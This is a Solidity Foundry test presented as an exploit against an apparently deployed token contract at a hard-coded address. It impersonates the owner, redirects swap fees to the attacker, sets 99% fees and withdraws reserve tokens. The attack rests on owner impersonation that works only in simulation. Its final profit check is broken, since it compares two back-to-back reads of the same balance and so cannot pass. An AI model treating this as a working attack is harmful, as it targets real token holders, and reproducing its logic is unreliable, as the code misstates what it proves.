// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CitysHome {
    function owner() external view returns (address);
    function setSwapAddress(address swapAddr) external;
    function setBurnFee(uint256 fee) external;
    function setSwapFee(uint256 fee) external;
    function ownerWithdrew(uint256 amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;
    address attacker = address(this);
    CitysHome chc;
    address dummy;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner during exploit
        // Just ensure we have the target contract interface
        chc = CitysHome(TARGET);

        // Create a dummy address for transfers
        dummy = address(0x123);
        vm.label(dummy, "Dummy Recipient");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial attacker balance for comparison
        uint256 initialBalance = chc.balanceOf(attacker);

        // Step 2: Impersonate the owner
        address owner = chc.owner();
        vm.startPrank(owner);

        // Step 3: Set swapAddress to attacker address
        chc.setSwapAddress(attacker);

        // Step 4: Set extremely high fees (99% each)
        chc.setBurnFee(99);
        chc.setSwapFee(99);

        // Step 5: Withdraw some tokens from contract reserve to attacker
        // The contract initially has 25,000,000 tokens minted to itself
        chc.ownerWithdrew(1000); // Withdraw 1000 * 1e18 tokens

        // Step 6: Transfer tokens from attacker (as swapAddress) to dummy
        // This triggers the fee mechanism where liquidity fees go back to swapAddress (attacker)
        chc.transfer(dummy, 100 * 10**18);

        vm.stopPrank();

        // Step 7: Verify attacker balance increased
        uint256 finalBalance = chc.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        // Verify ERC20 balance increased
        uint256 finalERC20Balance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));
        uint256 initialERC20Balance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

